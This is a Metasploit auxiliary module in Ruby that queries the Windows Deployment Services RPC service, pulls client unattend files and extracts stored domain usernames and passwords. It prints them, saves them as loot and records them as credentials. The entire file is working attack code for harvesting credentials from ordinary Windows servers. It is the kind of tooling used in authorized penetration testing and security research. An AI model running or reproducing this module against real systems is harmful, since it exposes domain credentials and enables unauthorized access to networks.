##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/dcerpc'
require 'rex/proto/dcerpc/wdscp'
require 'rex/parser/unattend'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  DCERPCPacket   	= Rex::Proto::DCERPC::Packet
  DCERPCClient   	= Rex::Proto::DCERPC::Client
  DCERPCResponse 	= Rex::Proto::DCERPC::Response
  DCERPCUUID     	= Rex::Proto::DCERPC::UUID
  WDS_CONST 		  = Rex::Proto::DCERPC::WDSCP::Constants

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
      'Description'    => %q{
        This module retrieves the client unattend file from Windows
        Deployment Services RPC service and parses out the stored credentials.
        Tested against Windows 2008 R2 x64 and Windows 2003 x86.
      },
      'Author'         => [ 'Ben Campbell' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
          [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html']
        ],
      ))

    register_options(
      [
        Opt::RPORT(5040),
      ])

    deregister_options('CHOST', 'CPORT', 'SSL', 'SSLVersion')

    register_advanced_options(
      [
        OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])
      ])
  end

  def run_host(ip)
    begin
      query_host(ip)
    rescue ::Interrupt
      raise $!
    rescue ::Rex::ConnectionError => e
      print_error("#{ip}:#{rport} Connection Error: #{e}")
    ensure
      # Ensure socket is pulled down afterwards
      self.dcerpc.socket.close rescue nil
      self.dcerpc = nil
      self.handle = nil
    end
  end

  def query_host(rhost)
    # Create a handler with our UUID and Transfer Syntax

    self.handle = Rex::Proto::DCERPC::Handle.new(
      [
        WDS_CONST::WDSCP_RPC_UUID,
        '1.0',
      ],
      'ncacn_ip_tcp',
      rhost,
      [datastore['RPORT']]
    )

    print_status("Binding to #{handle} ...")

    self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
    vprint_good("Bound to #{handle}")

    report_service(
      :host => rhost,
      :port => datastore['RPORT'],
      :proto => 'tcp',
      :name => "dcerpc",
      :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
    )

    table = Rex::Text::Table.new({
      'Header' => 'Windows Deployment Services',
      'Indent' => 1,
      'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
    })

    creds_found = false

    WDS_CONST::ARCHITECTURE.each do |architecture|
      if architecture[0] == :ARM && !datastore['ENUM_ARM']
        vprint_status "Skipping #{architecture[0]} architecture due to adv option"
        next
      end

      begin
        result = request_client_unattend(architecture)
      rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
        vprint_error(e.to_s)
        print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
        return nil
      end

      unless result.nil?
        loot_unattend(architecture[0], result)
        results = parse_client_unattend(result)

        results.each do |result|
          unless result.empty?
            if result['username'] and result['password']
              print_good("Retrived #{result['type']} credentials for #{architecture[0]}")
              creds_found = true
              domain = ""
              domain = result['domain'] if result['domain']
              report_creds(domain, result['username'], result['password'])
              table << [architecture[0], result['type'], domain, result['username'], result['password']]
            end
          end
        end
      end
    end

    if creds_found
      print_line
      table.print
      print_line
    else
      print_error("No Unattend files received, service is unlikely to be configured for completely unattended installation.")
    end
  end

  def request_client_unattend(architecture)
    # Construct WDS Control Protocol Message
    packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)

    guid = Rex::Text.rand_text_hex(32)
    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID, guid)

    # Not sure what this padding is for...
    mac = [0x30].pack('C') * 20
    mac << Rex::Text.rand_text_hex(12)
    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_MAC, mac)

    arch = [architecture[1]].pack('C')
    packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, arch)

    version = [1].pack('V')
    packet.add_var(	WDS_CONST::VAR_NAME_VERSION, version)

    wdsc_packet = packet.create

    vprint_status("Sending #{architecture[0]} Client Unattend request ...")
    dcerpc.call(0, wdsc_packet, false)
    timeout = datastore['DCERPC::ReadTimeout']
    response = Rex::Proto::DCERPC::Client.read_response(self.dcerpc.socket, timeout)

    if (response and response.stub_data)
      vprint_status('Received response ...')
      data = response.stub_data

      # Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
      op_error_code = data.unpack('v*')[19]
      if op_error_code == 0
        if data.length < 277
          vprint_error("No Unattend received for #{architecture[0]} architecture")
          return nil
        else
          vprint_status("Received #{architecture[0]} unattend file ...")
          return extract_unattend(data)
        end
      else
        vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
        return nil
      end
    end
  end

  def extract_unattend(data)
    start = data.index('<?xml')
    finish = data.index('</unattend>')
    if start and finish
      finish += 10
      return data[start..finish]
    else
      print_error("Incomplete transmission or malformed unattend file.")
      return nil
    end
  end

  def parse_client_unattend(data)
    begin
      xml = REXML::Document.new(data)
      return Rex::Parser::Unattend.parse(xml).flatten
    rescue REXML::ParseException => e
      print_error("Invalid XML format")
      vprint_line(e.message)
      return nil
     end
  end

  def loot_unattend(archi, data)
    return if data.empty?
    p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
    print_good("Raw version of #{archi} saved as: #{p}")
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_creds(domain, user, pass)
    report_cred(
      ip: rhost,
      port: 4050,
      service_name: 'dcerpc',
      user: "#{domain}\\#{user}",
      password: pass,
      proof: domain
    )
  end
end
